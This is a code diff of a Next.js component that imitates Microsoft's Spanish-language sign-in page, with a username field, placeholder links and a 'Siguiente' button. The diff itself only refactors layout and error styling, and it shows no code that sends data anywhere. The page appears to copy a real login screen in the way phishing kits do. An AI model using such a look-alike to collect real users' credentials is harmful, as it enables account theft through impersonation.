@@ -1,8 +1,8 @@
 "use client";
-import styles from "./styles/template.module.css";
 import Link from "next/link";
 import { FormContext, IFormStatus } from "./FormMicrosoft";
 import React, { useContext, useState } from "react";
+import styles from "./styles/template.module.css";
 
 function ErrorBox() {
   return (
@@ -59,44 +59,46 @@ export default function EmailForm() {
     <div className="flex flex-col gap-3">
       <h1 className={styles["form-title"]}>Iniciar sesión</h1>
       {haveError ? <ErrorBox /> : null}
-      <input
-        id="email-field"
-        className={styles["form-inputPrimary"]}
-        type="text"
-        aria-required="true"
-        onInput={(e) => handleInput(e)}
-        onKeyUp={(event) => {
-          if (event.key === "Enter" || event.keyCode === 13) {
-            handleSubmit();
-          }
-        }}
-        autoComplete="username"
-        maxLength={113}
-        name="email"
-        placeholder="Correo electrónico, teléfono o Skype"
-      />
-      <div className="flex flex-col gap-4 text-[13px]">
-        <p>
-          ¿No tiene una cuenta?{" "}
-          <Link className={styles["form-linkPrimary"]} href="#">
-            Cree una.
-          </Link>
-        </p>
-        <div>
-          <Link className={styles["form-linkPrimary"]} href="#">
-            ¿No puede acceder a su cuenta?
-          </Link>
+      <form onSubmit={(e) => e.preventDefault()}>
+        <input
+          id="email-field"
+          className={`${styles["form-inputPrimary"]} ${haveError && styles["form-error"]}`}
+          type="text"
+          aria-required="true"
+          onInput={handleInput}
+          onKeyUp={(event) => {
+            if (event.key === "Enter" || event.keyCode === 13) {
+              handleSubmit();
+            }
+          }}
+          autoComplete="username"
+          maxLength={113}
+          name="email"
+          placeholder="Correo electrónico, teléfono o Skype"
+        />
+        <div className="flex flex-col gap-4 text-[13px]">
+          <p>
+            ¿No tiene una cuenta?{" "}
+            <Link className={styles["form-linkPrimary"]} href="#">
+              Cree una.
+            </Link>
+          </p>
+          <div>
+            <Link className={styles["form-linkPrimary"]} href="#">
+              ¿No puede acceder a su cuenta?
+            </Link>
+          </div>
         </div>
-      </div>
-      <div className={styles["form-btnContainer"]}>
-        <button
-          type="button"
-          onClick={handleSubmit}
-          className={styles["form-btnPrimary"]}
-        >
-          Siguiente
-        </button>
-      </div>
+        <div className={styles["form-btnContainer"]}>
+          <button
+            type="button"
+            onClick={handleSubmit}
+            className={styles["form-btnPrimary"]}
+          >
+            Siguiente
+          </button>
+        </div>
+      </form>
     </div>
   );
 }
